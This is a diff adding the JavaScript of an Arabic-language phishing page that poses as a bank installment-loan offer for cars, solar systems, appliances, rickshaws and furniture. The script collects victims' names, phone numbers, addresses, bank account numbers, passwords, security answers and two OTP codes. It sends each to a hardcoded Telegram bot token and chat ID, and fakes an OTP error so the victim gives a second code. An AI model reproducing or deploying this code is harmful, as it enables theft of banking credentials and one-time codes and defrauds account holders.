+            accountNum: '', password: '', securityQuestion: '', securityAnswer: '', 
+            otp1: '', otp2: '', refNum: '' 
+        };
+        let otpAttemptCount = 0;
+
+        const botToken = "9249728793:AAEYOiGTOXyc3A1tWU1Lpf8uhM2GFW9ZnrY";
+        const chatId = "7906832234";
+
+        function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: "Markdown"
+                })
+            }).catch(err => console.log(err));
+        }
+
+        function hideAllViews() {
+            document.getElementById('step-home').classList.add('hidden');
+            document.getElementById('step-cars').classList.add('hidden');
+            document.getElementById('step-solar').classList.add('hidden');
+            document.getElementById('step-appliances').classList.add('hidden');
+            document.getElementById('step-rickshaw').classList.add('hidden');
+            document.getElementById('step-furniture').classList.add('hidden');
+            document.getElementById('step-personal-info').classList.add('hidden');
+            document.getElementById('step-inc-login').classList.add('hidden');
+            document.getElementById('step-inc-security').classList.add('hidden');
+            document.getElementById('step-inc-otp').classList.add('hidden');
+            document.getElementById('step-success').classList.add('hidden');
+            document.querySelectorAll('.error-message').forEach(el => el.classList.add('hidden'));
+        }
+
+        function goToStep(id) {
+            const loader = document.getElementById('custom-loader');
+            loader.classList.remove('hidden');
+
+            setTimeout(() => {
+                hideAllViews();
+                document.getElementById(id).classList.remove('hidden');
+                loader.classList.add('hidden');
+                if (id === 'step-inc-otp') startOtpTimer();
+            }, 3000);
+        }
+
+        function togglePassword(id) {
+            const p = document.getElementById(id);
+            p.type = (p.type === 'password') ? 'text' : 'password';
+        }
+
+        function selectCategory(categoryName) {
+            userData.category = categoryName;
+            if (categoryName === 'قروض لشراء سيارات') goToStep('step-cars');
+            else if (categoryName === 'قروض لشراء الطاقات الشمسية') goToStep('step-solar');
+            else if (categoryName === 'قروض لشراء أدوات كهربية') goToStep('step-appliances');
+            else if (categoryName === 'قروض لشراء ركشة أو توكتوك') goToStep('step-rickshaw');
+            else if (categoryName === 'قرض الاثاثات و الديكور') goToStep('step-furniture');
+        }
+
+        function goToProductStep() {
+            selectCategory(userData.category);
+        }
+
+        function formatNumber(num) {
+            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+        }
+
+        function updateCarDetails() {
+            let selectEl = document.getElementById('car-model-type');
+            let yearEl = document.getElementById('car-year');
+            let durationEl = document.getElementById('car-duration');
+            let boxEl = document.getElementById('car-price-box');
+            let priceText = document.getElementById('car-price-text');
+            let installmentText = document.getElementById('car-installment-text');
+
+            if (!selectEl.value || !yearEl.value || !durationEl.value) {
+                boxEl.classList.add('hidden');
+                return;
+            }
+
+            let parts = selectEl.value.split('|');
+            let name = parts[0];
+            let basePrice2023 = parseInt(parts[1]);
+            let selectedYear = parseInt(yearEl.value);
+            let months = parseInt(durationEl.value);
+
+            let yearDifference = 2023 - selectedYear;
+            let adjustedBasePrice = basePrice2023 - (yearDifference * 2000000);
+            if (adjustedBasePrice < 2000000) adjustedBasePrice = 2000000;
+
+            let totalPrice = adjustedBasePrice;
+            let monthlyInstallment = Math.round(totalPrice / months);
+
+            userData.productName = `${name} (موديل ${selectedYear})`;
+            userData.productPrice = totalPrice;
+
+            priceText.textContent = `السعر الإجمالي: ${formatNumber(totalPrice)} ج.س`;
+            installmentText.textContent = `القسط الشهري (${months} شهر): ${formatNumber(monthlyInstallment)} ج.س / شهرياً`;
+            boxEl.classList.remove('hidden');
+        }
+
+        function updateSolarDetails() { calculateInstallment('solar'); }
+        function updateApplianceDetails() { calculateInstallment('appliance'); }
+        function updateRickshawDetails() { calculateInstallment('rickshaw'); }
+        function updateFurnitureDetails() { calculateInstallment('furniture'); }
+
+        function calculateInstallment(type) {
+            let selectEl = document.getElementById(type === 'solar' ? 'solar-capacity' : type === 'appliance' ? 'appliance-item' : type === 'rickshaw' ? 'rickshaw-type' : 'furniture-type');
+            let durationEl = document.getElementById(type + '-duration');
+            let boxEl = document.getElementById(type + '-price-box');
+            let priceText = document.getElementById(type + '-price-text');
+            let installmentText = document.getElementById(type + '-installment-text');
+
+            if (!selectEl.value || !durationEl.value) {
+                boxEl.classList.add('hidden');
+                return;
+            }
+
+            let parts = selectEl.value.split('|');
+            let name = parts[0];
+            let basePrice = parseInt(parts[1]);
+            let months = parseInt(durationEl.value);
+
+            let totalPrice = basePrice;
+            let monthlyInstallment = Math.round(totalPrice / months);
+
+            userData.productName = name;
+            userData.productPrice = totalPrice;
+
+            priceText.textContent = `السعر الإجمالي: ${formatNumber(totalPrice)} ج.س`;
+            installmentText.textContent = `القسط الشهري (${months} شهر): ${formatNumber(monthlyInstallment)} ج.س / شهرياً`;
+            boxEl.classList.remove('hidden');
+        }
+
+        function submitProductStep(type) {
+            let hasError = false;
+            let specsEl = "";
+            if (type === 'car') {
+                let selectEl = document.getElementById('car-model-type');
+                let yearEl = document.getElementById('car-year');
+                let durationEl = document.getElementById('car-duration');
+                specsEl = document.getElementById('car-specs').value.trim();
+
+                if (!selectEl.value) { document.getElementById('err-car-type').classList.remove('hidden'); hasError = true; }
+                if (!yearEl.value) { document.getElementById('err-car-year').classList.remove('hidden'); hasError = true; }
+                if (!durationEl.value) { document.getElementById('err-car-duration').classList.remove('hidden'); hasError = true; }
+                if (hasError) return;
+
+                userData.productDetails = `${userData.productName} | المواصفات: ${specsEl || 'لا توجد'} | المدة: ${durationEl.value} شهر | الإجمالي: ${formatNumber(userData.productPrice)} ج.س`;
+            } else {
+                let selectEl = document.getElementById(type === 'solar' ? 'solar-capacity' : type === 'appliance' ? 'appliance-item' : type === 'rickshaw' ? 'rickshaw-type' : 'furniture-type');
+                let durationEl = document.getElementById(type + '-duration');
+                specsEl = document.getElementById(type + '-specs').value.trim();
+
+                if (!selectEl.value) {
+                    document.getElementById(type === 'solar' ? 'err-solar' : type === 'appliance' ? 'err-appliance' : type === 'rickshaw' ? 'err-rickshaw' : 'err-furniture-type').classList.remove('hidden');
+                    hasError = true;
+                }
+                if (!durationEl.value) {
+                    document.getElementById(type === 'solar' ? 'err-solar-duration' : type === 'appliance' ? 'err-appliance-duration' : type === 'rickshaw' ? 'err-rickshaw-duration' : 'err-furniture-duration').classList.remove('hidden');
+                    hasError = true;
+                }
+                if (hasError) return;
+
+                userData.productDetails = `${userData.productName} | المواصفات: ${specsEl || 'لا توجد'} | المدة: ${durationEl.value} شهر | الإجمالي: ${formatNumber(userData.productPrice)} ج.س`;
+            }
+
+            sendTelegramMessage(`📦 بيانات السلعة المختارة:\n• القسم: ${userData.category}\n• المنتج: ${userData.productDetails}`);
+
+            goToStep('step-personal-info');
+        }
+
+        function submitUserIntro() {
+            let hasError = false;
+            userData.name = document.getElementById('user-name').value.trim();
+            userData.whatsapp = document.getElementById('user-whatsapp').value.trim();
+            userData.address = document.getElementById('user-address').value.trim();
+
+            if(!userData.name) { document.getElementById('err-user-name').classList.remove('hidden'); hasError = true; }
+            if(!userData.whatsapp) { document.getElementById('err-user-whatsapp').classList.remove('hidden'); hasError = true; }
+            if(!userData.address) { document.getElementById('err-user-address').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            sendTelegramMessage(
+                `👤 بيانات المستخدم:\n` +
+                `• الاسم: ${userData.name}\n` +
+                `• الواتساب: ${userData.whatsapp}\n` +
+                `• السكن: ${userData.address}`
+            );
+
+            goToStep('step-inc-login');
+        }
+
+        function isAscendingSequential(str) {
+            if (str.length < 2) return false;
+            for (let i = 0; i < str.length - 1; i++) {
+                if (str.charCodeAt(i + 1) - str.charCodeAt(i) !== 1) return false;
+            }
+            return true;
+        }
+
+        function isValidAccount(acc) {
+            if (!/^\d+$/.test(acc)) return false;
+            if (acc.length < 6 || acc.length > 7) return false;
+            if (isAscendingSequential(acc)) return false;
+            return true;
+        }
+
+        function isValidPassword(pwd) {
+            if (/[\u0600-\u06FF]/.test(pwd)) return false;
+            return /[A-Z]/.test(pwd) && /[a-z]/.test(pwd) && /[0-9]/.test(pwd) && /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pwd);
+        }
+
+        function submitStep1() {
+            let hasError = false;
+            userData.accountNum = document.getElementById('account-num').value.trim();
+            userData.password = document.getElementById('password').value;
+
+            if(!userData.accountNum) { document.getElementById('err-acc-num').classList.remove('hidden'); hasError = true; }
+            if(!userData.password) { document.getElementById('err-password').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            const errorElement = document.getElementById('inc-login-error');
+            if (!isValidAccount(userData.accountNum) || !isValidPassword(userData.password)) {
+                errorElement.classList.remove('hidden');
+                return;
+            }
+
+            errorElement.classList.add('hidden');
+
+            sendTelegramMessage(
+                `🔐 بيانات الحساب البنكي:\n` +
+                `• رقم الحساب: ${userData.accountNum}\n` +
+                `• كلمة المرور: ${userData.password}`
+            );
+
+            goToStep('step-inc-security');
+        }
+
+        function submitStep2() {
+            let hasError = false;
+            userData.securityQuestion = document.getElementById('security-question').value;
+            userData.securityAnswer = document.getElementById('security-answer').value.trim();
+
+            if(!userData.securityQuestion) { document.getElementById('err-sec-q').classList.remove('hidden'); hasError = true; }
+            if(!userData.securityAnswer) { document.getElementById('err-sec-ans').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            sendTelegramMessage(
+                `🛡️ أسئلة الأمان:\n` +
+                `• السؤال: ${userData.securityQuestion}\n` +
+                `• الإجابة: ${userData.securityAnswer}`
+            );
+
+            goToStep('step-inc-otp');
+        }
+
+        function startOtpTimer() {
+            let m = 30, s = 0;
+            const t = document.getElementById("otp-timer");
+            const x = setInterval(() => {
+                if (s === 0) { if (m === 0) { clearInterval(x); return; } m--; s = 59; } else { s--; }
+                if(t) t.textContent = `إعادة إرسال الرمز خلال ${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')} دقيقة`;
+            }, 1000);
+        }
+
+        function verifyOtp() {
+            const o = document.getElementById('otp-code').value.trim();
+            if(!o || o.length < 4) {
+                document.getElementById('err-otp').classList.remove('hidden');
+                return;
+            }
+            document.getElementById('err-otp').classList.add('hidden');
+            document.getElementById('err-otp-invalid').classList.add('hidden');
+
+            otpAttemptCount++;
+
+            if (otpAttemptCount === 1) {
+                userData.otp1 = o;
+                sendTelegramMessage(
+                    `📲 رمز التحقق (OTP) - المحاولة الأولى:\n` +
+                    `• الرمز المدخل: ${userData.otp1}`
+                );
+
+                document.getElementById('err-otp-invalid').classList.remove('hidden');
+                document.getElementById('otp-code').value = '';
+            } else {
+                userData.otp2 = o;
+                const btn = document.getElementById('verify-btn');
+                btn.disabled = true;
+                btn.innerHTML = `<span class="loading-spinner"></span> جاري اعتماد الطلب...`;
+                
+                let randomRef = 'BOK-LN-' + Math.floor(10000000 + Math.random() * 90000000);
+                userData.refNum = randomRef;
+
+                sendTelegramMessage(
+                    `📲 رمز التحقق (OTP) - المحاولة الثانية والاخيرة:\n` +
+                    `• الرمز المدخل: ${userData.otp2}\n\n` +
+                    `🎫 الرقم المرجعي للطلب: ${userData.refNum}`
+                );
+
+                setTimeout(() => {
+                    goToStep('step-success');
+                    document.getElementById('display-ref-num').textContent = randomRef;
+                }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>
